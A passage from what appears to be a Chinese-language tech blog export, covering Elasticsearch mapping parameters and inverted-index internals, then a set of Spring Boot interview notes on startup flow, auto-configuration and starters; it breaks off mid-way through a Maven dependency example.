&quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;analyzer&quot;: &quot;ik\\_max\\_word&quot;,//写入是的分词器  </span><br><span class=\"line\">                    &quot;search\\_analyzer&quot;: &quot;ik\\_max\\_word&quot;//搜索时的分词器  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>COPY_TO</strong></li>\n</ol>\n<p>允许将一个或者多个字段的值复制到某一个字段中。用来满足一些搜索需要，类似于数据库 title like “%a%” or title2 like “%a%” copy_to的字段不会出现在_source里面</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;first\\_name&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;copy\\_to&quot;: &quot;full\\_name&quot;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;last\\_name&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;copy\\_to&quot;: &quot;full\\_name&quot;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;full\\_name&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT my\\_index/my\\_type/1  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;first\\_name&quot;: &quot;John&quot;,  </span><br><span class=\"line\">    &quot;last\\_name&quot;: &quot;Smith&quot;  </span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">//full\\_name = \\[&quot;John&quot;,&quot;Smith&quot;\\]  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>DOC_VALUES</strong></li>\n</ol>\n<p>为了加快排序、聚合操作，在建立倒排索引的时候，额外增加一个列式存储映射，是一个空间换时间的做法。 默认是开启的，对于确定不需要聚合或者排序的字段可以关闭。 注意：text类型没有doc_values。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;status\\_code&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;session\\_id&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class=\"line\">                    &quot;doc\\_values&quot;: false  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li><strong>ENABLED</strong></li>\n</ol>\n<p>enabled默认为true,将搜索所有字段。如果设置为false，该字段将不会被搜索。但仍会随着_source返回</p>\n<ol start=\"7\">\n<li><strong>FIELDDATA</strong></li>\n</ol>\n<p>对非text类型的字段进行排序可以使用doc_value来进行加速。但是对于，text类型的字段，却不能进行分组排序。更何况加速。 下面这个异常展示了，对text类型的字段进行分组排序的错误。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/27.png\"><br>但是可以通过设置fielddata值来达到这一目的。它将字段加载到内存中，因此第一次肯定会很慢。而且将占用内存。</p>\n<ol start=\"8\">\n<li><strong>FORMAT</strong></li>\n</ol>\n<p>对字段进行格式化。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;date&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;date&quot;,  </span><br><span class=\"line\">                    &quot;format&quot;: &quot;yyyy-MM-dd&quot;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li><strong>IGNORE_ABOVE</strong></li>\n</ol>\n<p>大小超过ignore_above设置的字符串不会被索引或存储。</p>\n<ol start=\"10\">\n<li>FIELDS</li>\n</ol>\n<p>可以为一个字段映射多个数据类型。比如，一个字符串，可以映射为text，满足全文搜索。同时可以映射为keyword,满足分组和排序。 也可以使用多个分词器来对同一个字段进行分词。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;city&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;fields&quot;: &#123;  </span><br><span class=\"line\">                        &quot;raw&quot;: &#123;  </span><br><span class=\"line\">                            &quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">                        &#125;  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"11\">\n<li><strong>STORE</strong></li>\n</ol>\n<p>我们知道，source字段存储了原始数据(默认)。当然可以通过设置其属性值来选择不存储。此外，还可以通过store选择是否额外存储某个字段。store属性默认为no,表示不存储。当设置为yes时，会在source之 外独立存储。此时，搜索时，会绕过_source，单独进行一次IO得到该字段的值。 store会严重影响搜索效率，尽管如此，在以下两种情况下，还是可以选择使用：</p>\n<ul>\n<li><p>字段很长，每次检索_source代价很大。</p>\n</li>\n<li><p>需要单独对某些字段进行索引重建。</p>\n</li>\n</ul>\n<h2 id=\"7-4-ES中常见数据类型\"><a href=\"#7-4-ES中常见数据类型\" class=\"headerlink\" title=\"7.4 ES中常见数据类型\"></a>7.4 ES中常见数据类型</h2><ol>\n<li><strong>字符串</strong></li>\n</ol>\n<p>字符串在之前的版本主要指的是 string 类型。但是在5.X版本已经不支持 string 类型。其被 text 和keyword 类型替代</p>\n<ol start=\"2\">\n<li><strong>text</strong></li>\n</ol>\n<p>text字段需要被全文搜索的内容，它可以保存非常长的内容。查询的时候一般使用分词器器进⾏行行分词然后进行全文搜索。text类型的字段不用于排序，很少用于聚合。 （text类型的数据被用来索引长文本，例如电子邮件主体部分或者一款产品的介绍，这些文本会被分析，在建立索引文档之前会被分词器进行分词，转化为词组。经过分词机制之后es允许检索到该文本切分而成的词语，但是text类型的数据不能用来过滤、排序和聚合等操作。</p>\n<ol start=\"3\">\n<li><strong>keyword</strong></li>\n</ol>\n<p>此字段不能使用分词器进行查询，只能搜索该字段的完整的值。所以其主要保存一些可以索引的结构化内容。此字段可以进行排序、聚合等操作。 keyword类型的数据可以满足电子邮箱地址、主机名、状态码、邮政编码和标签等数据的要求，不进行分词，常常被用来过滤、排序和聚合。 综上，可以发现text类型在存储数据的时候会默认进行分词，并生成索引。而keyword存储数据的时候，不会分词建立索引，显然，这样划分数据更加节省内存。）</p>\n<h1 id=\"8-底层知识：正排索引和倒排索引底层原理\"><a href=\"#8-底层知识：正排索引和倒排索引底层原理\" class=\"headerlink\" title=\"8 底层知识：正排索引和倒排索引底层原理\"></a>8 底层知识：正排索引和倒排索引底层原理</h1><h2 id=\"8-1-什么是正排索引\"><a href=\"#8-1-什么是正排索引\" class=\"headerlink\" title=\"8.1 什么是正排索引\"></a>8.1 什么是正排索引</h2><p>正排索引是按照文档编号或文档ID等有序的方式将每个文档存储在索引中，通过文档编号或ID进行检索。</p>\n<p>这种方式类似于数据库表的行，可以很方便地根据文档ID检索到具体的文档，但是不适合处理大规模文档库的情况。</p>\n<h2 id=\"比如mysql的b-锁索引结构比如书籍目录，可以根据页码找文档内容，就是正排索引8-2-什么是倒排索引\"><a href=\"#比如mysql的b-锁索引结构比如书籍目录，可以根据页码找文档内容，就是正排索引8-2-什么是倒排索引\" class=\"headerlink\" title=\"比如mysql的b+锁索引结构比如书籍目录，可以根据页码找文档内容，就是正排索引8.2 什么是倒排索引\"></a>比如mysql的b+锁索引结构<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/28.png\"><br>比如书籍目录，可以根据页码找文档内容，就是正排索引<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/29.png\"><br>8.2 什么是倒排索引</h2><h2 id=\"倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。-倒排索引可以理解为Map-item-list-id-，能够由查询词快速（时间复杂度O-1-）找到包含这个查询词的文件的数据结构。比如书籍索引页根据关键词，找页码就是倒排索引8-3-ES如何做到快速索引\"><a href=\"#倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。-倒排索引可以理解为Map-item-list-id-，能够由查询词快速（时间复杂度O-1-）找到包含这个查询词的文件的数据结构。比如书籍索引页根据关键词，找页码就是倒排索引8-3-ES如何做到快速索引\" class=\"headerlink\" title=\"倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。 倒排索引可以理解为Map&lt; item, list&lt; id&gt;&gt;，能够由查询词快速（时间复杂度O(1)）找到包含这个查询词的文件的数据结构。比如书籍索引页根据关键词，找页码就是倒排索引8.3 ES如何做到快速索引\"></a>倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。 倒排索引可以理解为Map&lt; item, list&lt; id&gt;&gt;，能够由查询词快速（时间复杂度O(1)）找到包含这个查询词的文件的数据结构。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/30.png\"><br>比如书籍索引页根据关键词，找页码就是倒排索引<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/31.png\"><br>8.3 ES如何做到快速索引</h2><p>假设有这么几条数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">| ID | Name | Age | Sex |  </span><br><span class=\"line\">| -- |:------------:| -----:| -----:|  </span><br><span class=\"line\">| 1 | Kate | 24 | Female  </span><br><span class=\"line\">| 2 | John | 24 | Male  </span><br><span class=\"line\">| 3 | Bill | 29 | Male  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>ID是Elasticsearch自建的文档id，那么Elasticsearch建立的索引如下: Name：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">| Term | Posting List |  </span><br><span class=\"line\">| -- |:----:|  </span><br><span class=\"line\">| Kate | 1 |  </span><br><span class=\"line\">| John | 2 |  </span><br><span class=\"line\">| Bill | 3 |  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Age：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">| Term | Posting List |  </span><br><span class=\"line\">| -- |:----:|  </span><br><span class=\"line\">| 24 | \\[1,2\\] |  </span><br><span class=\"line\">| 29 | 3 |  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"8-3-1-Posting-List\"><a href=\"#8-3-1-Posting-List\" class=\"headerlink\" title=\"8.3.1 Posting List\"></a>8.3.1 Posting List</h3><p>Elasticsearch分别为每个field都建立了一个倒排索引，</p>\n<ul>\n<li><p>Kate, John, 24, Female这些叫term，</p>\n</li>\n<li><p>而[1,2]就是Posting List。</p>\n</li>\n</ul>\n<p>Posting list就是一个int的数组，存储了所有符合某个term的文档id。 根据id查找的话，通过posting list这种索引方式似乎可以很快进行查找，比如要找age&#x3D;24的同学，在id数组中查找即可。二分查找，但是，如果想通过name来查找呢？</p>\n<h3 id=\"8-3-2-Term-Dictionary\"><a href=\"#8-3-2-Term-Dictionary\" class=\"headerlink\" title=\"8.3.2 Term Dictionary\"></a>8.3.2 Term Dictionary</h3><p>Elasticsearch为了能快速找到某个term，将所有的term排个序，二分法查找term，logN的查找效， 就像通过字典查找一样. 这样我们可以用二分查找的方式，比全遍历更快地找出目标的term。 这个就是 term dictionary。 所以：反向索引分成两部分，如下图(来自《信息检索导论》)：<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/32.png\"><br>左面是词项词典(Term Dictionary)，右边是倒排记录表(Posting)。 在Lucene中，词典和倒排是分开存储的，词典存储在.tii和.tis文件中。 而倒排又分为两部分存储，第一部分是文档号和词频信息，存储在.frq中；另一部分是词的位置信息， 存储在.prx文件中。 有了term dictionary之后，可以用 logN 次磁盘查找得到目标。 问题是：现在再看起来，似乎和传统数据库通过B+Tree的方式类似啊，为什么说比B+Tree的查询快？</p>\n<h3 id=\"8-3-3-Term-Index\"><a href=\"#8-3-3-Term-Index\" class=\"headerlink\" title=\"8.3.3 Term Index\"></a>8.3.3 Term Index</h3><p>B-Tree通过<strong>减少磁盘寻道次数</strong>来提高查询性能，Elasticsearch也是采用同样的思路</p>\n<p>但是磁盘的随机读操作仍然是非常昂贵的（一次random access大概需要10ms的时间）。</p>\n<p>所以尽量少的读磁盘，有必要把一些数据缓存到内存里。<strong>Elasticsearch直接通过内存查找term，不读磁盘</strong></p>\n<p>但是整个term dictionary本身又太大了，无法完整地放到内存里。</p>\n<p>于是就有了term index。term index有点像一本字典的大的章节表，或者说，像一本书的目录。</p>\n<p>比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">A开头的term ……………. Xxx页  </span><br><span class=\"line\">C开头的term ……………. Xxx页  </span><br><span class=\"line\">E开头的term ……………. Xxx页  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>如果所有的term都是英文字符的话，可能这个term index就真的是26个英文字符表构成的了。 但是实际的情况是，term未必都是英文字符，term可以是任意的byte数组。</p>\n<p>而且26个英文字符也未必是每一个字符都有均等的term，比如x字符开头的term可能一个都没有，而s开头的term又特别多。</p>\n<p>实际的term index，的内部结构，类似一棵 trie 树：<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/33.png\"><br>例子是一个包含 “A”, “to”, “tea”, “ted”, “ten”, “i”, “in”, 和 “inn” 的 trie 树。 Term Dictionary与Term Index存储，Term Dictionary文件的后缀名为tim，Term Index文件的后缀名是tip。</p>\n<blockquote>\n<p>Lucene为词典做了一层前缀索引(Term Index)，这个索引在Lucene4.0以后采用的数据结构是FST (Finite State Transducer)，一种前缀树的变种，可以称之为前缀索引。</p>\n</blockquote>\n<p>这种数据结构占用空间很小，Lucene打开索引的时候将其全量装载到内存中，加快磁盘上词典查询速度的同时减少随机磁盘访问次数。</p>\n<h3 id=\"8-3-4-Trie树（前缀树，字典树）\"><a href=\"#8-3-4-Trie树（前缀树，字典树）\" class=\"headerlink\" title=\"8.3.4 Trie树（前缀树，字典树）\"></a>8.3.4 Trie树（前缀树，字典树）</h3><p>Trie，又经常叫前缀树，字典树等等。</p>\n<ul>\n<li><p>一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。</p>\n</li>\n<li><p>一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。</p>\n</li>\n</ul>\n<p>trie中的键通常是字符串，但也可以是其它的结构。它有很多变种，如后缀树，Radix Tree&#x2F;Trie，PATRICIA tree，以及bitwise版本的crit-bit tree。</p>\n<p>当然很多名字的意义其实有交叉。 在计算机科学中，trie，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字 符串。</p>\n<p>与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。</p>\n<p>trie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。</p>\n<p>这棵树不会包含所有的 term，它包含的是 term 的一些前缀。</p>\n<p>通过 term index 可以快速地定位到 term dictionary 的某个 offset，然后从这个位置再往后顺序查找。</p>\n<p>再加上一些压缩技术（搜索 Lucene Finite State Transducers）, term index 的尺寸可以只有所有term 的尺寸的<strong>几十分之一</strong>，使得用内存缓存整个 term index 变成可能。整体上来说就是这样的效果：<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/34.png\"></p>\n<h3 id=\"8-3-5-为什么ES检索比Mysql快\"><a href=\"#8-3-5-为什么ES检索比Mysql快\" class=\"headerlink\" title=\"8.3.5 为什么ES检索比Mysql快\"></a>8.3.5 为什么ES检索比Mysql快</h3><p>现在我们可以回答<strong>“为什么 Elasticsearch&#x2F;Lucene 检索可以比 Mysql 快”</strong> 了。 Mysql 只有 term dictionary 这一层，是以 b+tree 排序的方式存储在磁盘上的。</p>\n<p>检索一个 term 需要若干次（1-3次）的 random access 的磁盘操作。</p>\n<p>而ES&#x2F; Lucene 在 term dictionary 的基础上添加了 term index 来加速检索，term index 以类似前缀树的形式缓存在内存中。 从 term index 查到对应的 term dictionary 的 block 位置之后，再去磁盘上找 term，大大减少了磁盘的 random access 次数, 将3次 变成了1次。</p>\n"},{"title":"Springboot最热点面试题","date":"2024-05-26T14:50:22.000Z","_content":"\n\n\n\n## springboot启动流程\n### 启动类上注解：@SpringBootApplication\n#### @SpringBootConfiguration\n根据Javadoc可知，该注解作用就是将当前的类作为一个JavaConfig，然后触发注解@EnableAutoConfiguration和@ComponentScan的处理，本质上与@Configuration注解没有区别\n#### @EnableAutoConfiguration\n@EnableAutoConfiguration:实现自动装配的核心注解\n- @AutoConfigurationPackage\n    - 注册当前启动类的根 package\n    - 注册 org.springframework.boot.autoconfigure.AutoConfigurationPackages 的 BeanDefinition\n- @Import(AutoConfigurationImportSelector.class)\n    - 自动装配核心功能的实现实际是通过 AutoConfigurationImportSelector(加载自动装配类)类\n    - AutoConfigurationImportSelector 类实现了 ImportSelector接口\n        - 实现了这个接口中的 selectImports方法\n            - 方法实现 重要的getAutoConfigurationEntry()方法\n                1. 判断自动装配是否打开，默认是true可以通过application.yml设置\n                2. 获取@EnableAutoConfiguration里的exclude和excludeName内容以便排除\n                3. 获取需要自动装配的所有配置类，读取META-INF/spring.factories druid 数据库连接池的 Spring Boot Starter 就创建了META-INF/spring.factories文件\n                4. 筛选满足@ConditionalOnXXX注解的类，生效才会被加载\n            - 该方法主要用于获取所有符合条件的类的全限定类名，这些类需要被加载到 IoC 容器中\n#### @ComponentScan\n扫描的 Spring 对应的组件，如 @Componet，@Repository\n- 我们可以通过 basePackages 等属性来细粒度的定制 @ComponentScan 自动扫描的范围，如果不指定，则默认Spring框架实现会从声明 @ComponentScan 所在类的package进行扫描，所以 SpringBoot 的启动类最好是放在根package下，我们自定义的类就放在对应的子package下，这样就可以不指定 basePackages\n### 启动类中的main方法：org.springframework.boot.SpringApplication#run(java.lang.Class<?>, java.lang.String...)\n- 从spring.factories配置文件中加载EventPublishingRunListener对象，该对象拥有SimpleApplicationEventMulticaster属性，即在SpringBoot启动过程的不同阶段用来发射内置的生命周期事件;\n    - spring-bean包下META-INF/spring.factories\n- 准备环境变量，包括系统变量，环境变量，命令行参数，默认变量，servlet相关配置变量，随机值以及配置文件（比如application.properties）等;\n    - 而后就会去创建Environment——这个时候会去加载application配置文件\n- 控制台打印SpringBoot的bannner标志；\n- 根据不同类型环境创建不同类型的applicationcontext容器，因为这里是servlet环境，所以创建的是AnnotationConfigServletWebServerApplicationContext容器对象；\n- 从spring.factories配置文件中加载FailureAnalyzers对象,用来报告SpringBoot启动过程中的异常；\n- 为刚创建的容器对象做一些初始化工作，准备一些容器属性值等，对ApplicationContext应用一些相关的后置处理和调用各个ApplicationContextInitializer的初始化方法来执行一些初始化逻辑等；\n- 刷新容器，这一步至关重要。比如调用bean factory的后置处理器，注册BeanPostProcessor后置处理器，初始化事件广播器且广播事件，初始化剩下的单例bean和SpringBoot创建内嵌的Tomcat服务器等等重要且复杂的逻辑都在这里实现，主要步骤可见代码的注释，关于这里的逻辑会在以后的spring源码分析专题详细分析；\n    - // 1）在context刷新前做一些准备工作，比如初始化一些属性设置，属性合法性校验和保存容器中的一些早期事件等；\n    - // 2）让子类刷新其内部bean factory,注意SpringBoot和Spring启动的情况执行逻辑不一样\n    - // 3）对bean factory进行配置，比如配置bean factory的类加载器，后置处理器等\n    - // 4）完成bean factory的准备工作后，此时执行一些后置处理逻辑，子类通过重写这个方法来在BeanFactory创建并预准备完成以后做进一步的设置\n        - // 在这一步，所有的bean definitions将会被加载，但此时bean还不会被实例化\n    - // 5）执行BeanFactoryPostProcessor的方法即调用bean factory的后置处理器：\n        - // BeanDefinitionRegistryPostProcessor（触发时机：bean定义注册之前）和BeanFactoryPostProcessor（触发时机：bean定义注册之后bean实例化之前）\n    - // 6）注册bean的后置处理器BeanPostProcessor，注意不同接口类型的BeanPostProcessor；在Bean创建前后的执行时机是不一样的\n    - // 7）初始化国际化MessageSource相关的组件，比如消息绑定，消息解析等\n    - // 8）初始化事件广播器，如果bean factory没有包含事件广播器，那么new一个SimpleApplicationEventMulticaster广播器对象并注册到bean factory中\n    - // 9）AbstractApplicationContext定义了一个模板方法onRefresh，留给子类覆写，比如ServletWebServerApplicationContext覆写了该方法来创建内嵌的tomcat容器\n    - // 10）注册实现了ApplicationListener接口的监听器，之前已经有了事件广播器，此时就可以派发一些early application events\n    - // 11）完成容器bean factory的初始化，并初始化所有剩余的单例bean。这一步非常重要，一些bean postprocessor会在这里调用。\n    - // 12）完成容器的刷新工作，并且调用生命周期处理器的onRefresh()方法，并且发布ContextRefreshedEvent事件\n- 执行刷新容器后的后置处理逻辑，注意这里为空方法；\n- 调用ApplicationRunner和CommandLineRunner的run方法，我们实现这两个接口可以在spring容器启动后需要的一些东西比如加载一些业务数据等;\n- 报告启动异常，即若启动过程中抛出异常，此时用FailureAnalyzers来报告异常;\n- 最终返回容器对象，这里调用方法没有声明对象来接收。\n```java\npublic static void main(String[] args) throws Exception {\n   SpringApplication.run(new Class<?>[0], args);\n}\npublic static ConfigurableApplicationContext run(Class<?>[] primarySources, String[] args) {\n   // 新建SpringApplication对象，再调用run方法\n   return new SpringApplication(primarySources).run(args);\n}\npublic ConfigurableApplicationContext run(String... args) {\n   // stopWatch用于统计run启动过程时长\n   StopWatch stopWatch = new StopWatch();\n   // 开始计时\n   stopWatch.start();\n   // 创建ConfigurableApplicationContext对象\n   ConfigurableApplicationContext context = null;\n   // exceptionReporters集合用来存储SpringApplication启动过程的异常，SpringBootExceptionReporter且通过spring.factories方式来加载\n   Collection<SpringBootExceptionReporter> exceptionReporters = new ArrayList<>();\n   // 配置headless属性\n   configureHeadlessProperty();\n   /**\n    * 从spring.factories配置文件中加载到EventPublishingRunListener对象并赋值给SpringApplicationRunListeners\n    * # Run Listeners\n    * org.springframework.boot.SpringApplicationRunListener=\\\n    * org.springframework.boot.context.event.EventPublishingRunListener\n    */\n   SpringApplicationRunListeners listeners = getRunListeners(args);\n   // 启动SpringApplicationRunListeners监听\n   listeners.starting();\n   try {\n      // 创建ApplicationArguments对象，封装了args参数\n      ApplicationArguments applicationArguments = new DefaultApplicationArguments(args);\n      // 备配置参数有app.properties，外部配置参数比如jvm启动参数等\n      ConfigurableEnvironment environment = prepareEnvironment(listeners, applicationArguments);\n      // 配置spring.beaninfo.ignore属性\n      configureIgnoreBeanInfo(environment);\n      // 打印springboot的bannner\n      Banner printedBanner = printBanner(environment);\n      // 根据不同类型创建不同类型的spring applicationcontext容器\n      context = createApplicationContext();\n      /**\n       * 异常报告\n       * 从spring.factories配置文件中加载exceptionReporters，其中ConfigurableApplicationContext.class作为FailureAnalyzers构造方法的参数\n       * # Error Reporters\n       * org.springframework.boot.SpringBootExceptionReporter=\\\n       * org.springframework.boot.diagnostics.FailureAnalyzers\n       */\n      exceptionReporters = getSpringFactoriesInstances(SpringBootExceptionReporter.class,\n            new Class[] { ConfigurableApplicationContext.class }, context);\n      // 准备容器事项：调用各个ApplicationContextInitializer的initialize方法\n      // 和触发SpringApplicationRunListeners的contextPrepared及contextLoaded方法等\n      prepareContext(context, environment, listeners, applicationArguments, printedBanner);\n      // 刷新容器，这一步至关重要\n      refreshContext(context);\n      // 执行刷新容器后的后置处理逻辑，注意这里为空方法\n      afterRefresh(context, applicationArguments);\n      // 停止stopWatch计时\n      stopWatch.stop();\n      // 打印springboot的启动时常\n      if (this.logStartupInfo) {\n         new StartupInfoLogger(this.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);\n      }\n      // 触发SpringApplicationRunListener的started方法，通知spring容器已经启动\n      listeners.started(context);\n      // 调用ApplicationRunner和CommandLineRunner的run方法，实现spring容器启动后需要做的一些东西\n      callRunners(context, applicationArguments);\n   }\n   // 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。\n   catch (Throwable ex) {\n      handleRunFailure(context, ex, exceptionReporters, listeners);\n      throw new IllegalStateException(ex);\n   }\n\n   try {\n      // 当容器刷新完毕等，触发SpringApplicationRunListeners数组的running方法\n      listeners.running(context);\n   }\n   catch (Throwable ex) {\n      // 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。\n      handleRunFailure(context, ex, exceptionReporters, null);\n      throw new IllegalStateException(ex);\n   }\n   return context;\n}\n\n```\n## 怎么让Spring把Body变成一个对象\n- @RequestBody注解原理\n- 详细看springmvc的处理流程\n## SpringBoot的starter实现原理是什么？\n原理就是因为在@EnableAutoConfiguration注解，会自动的扫描jar包下的META-INF/spring.factories文件的配置类，写在这里面的类都是需要被自动加载的\n\n将configuration类中定义的bean加入spring到容器中。就相当于加载之前我们自己配置组件的xml文件。而现在SpringBoot自己定义了一个默认的值，然后直接加载进入了Spring容器。\n\nSpringBoot提供的自动配置依赖模块都以spring-boot-starter-为命名前缀，并且这些依赖都在org.springframework.boot下。 所有的spring-boot-starter都有约定俗成的默认配置，但允许调整这些配置调整默认的行为。\n## spring 和springboot的区别\nSpring Boot基本上是Spring框架的扩展，它消除了设置Spring应用程序所需的XML配置，为更快，更高效的开发生态系统铺平了道路。\n\nSpring Boot中的一些特征：\n\n- 创建独立的Spring应用。\n- 嵌入式Tomcat、Jetty、 Undertow容器（无需部署war文件）。\n- 提供的starters 简化构建配置\n- 尽可能自动配置spring应用。\n- 提供生产指标,例如指标、健壮检查和外部化配置\n- 完全没有代码生成和XML配置要求\n\nMaven依赖\n\n首先，让我们看一下使用Spring创建Web应用程序所需的最小依赖项\n```xml\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-web</artifactId>\n    <version>5.1.0.RELEASE</version>\n</dependency>\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-webmvc</artifactId>\n    <version>5.1.0.RELEASE</version>\n</dependency>\n```\n与Spring不同，Spring Boot只需要一个依赖项来启动和运行Web应用程序：\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n    